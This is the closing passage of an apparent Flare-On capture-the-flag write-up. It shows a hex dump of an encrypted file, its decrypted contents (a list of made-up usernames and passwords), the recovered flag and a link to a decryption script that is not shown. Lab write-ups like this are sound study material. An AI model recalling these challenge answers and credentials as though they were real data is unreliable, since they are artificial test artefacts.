0060   0d 1d 18 88 41 5b 4f 06 17 6c 9e 0b 01 73 9d 83
0070   60 18 fa 8b ff f8 4d 78 b2 a4 24 6f ae bd 92 d1
0080   ec cc 2d 7c 8b bf d0 8c bd e2 45 ef 15 b2 88 bc
0090   a4 59 be 20 ac f9 57 df 10 ba bc d9 11 93 41 19
00a0   00 9c 02 25 ef c4 4a 26 fd 25 ca 9b 85 19 64 4e
00b0   c5 84 9f a1 00 18 2c 68 30 dc 70 4c fe 83 f1 c7
00c0   00 2b 49 7a 83 09 05 77 6e 0a 08 8d 56 e4 38 7e
00d0   88 0f 2c 41 e4 33 66 c9 bc 06 aa 2a a1 96 2d 94
00e0   c0 08 16 1e a4 f2 81 1a 83 f7 7c b5 7d 63 13 00
00f0   41 96 ca 69 80 ae 49 e9 5d 0f 7d 89 43 d4 89 1a
0100   01 b4 61 61
```

Decrypting this file give us the following nice, cleartext:
```
roy:h4ve_you_tri3d_turning_1t_0ff_and_0n_ag4in@flare-on.com:goat
moss:Pot-Pocket-Pigeon-Hunt-8:narwhal
jen:Straighten-Effective-Gift-Pity-1:bunny
richmond:Inventor-Hut-Autumn-Tray-6:bird
denholm:123:dog
```

Which gives us the flag: `h4ve_you_tri3d_turning_1t_0ff_and_0n_ag4in@flare-on.com`

The script that decrypts these files is [crack_file.py](./crack_file.py).

___
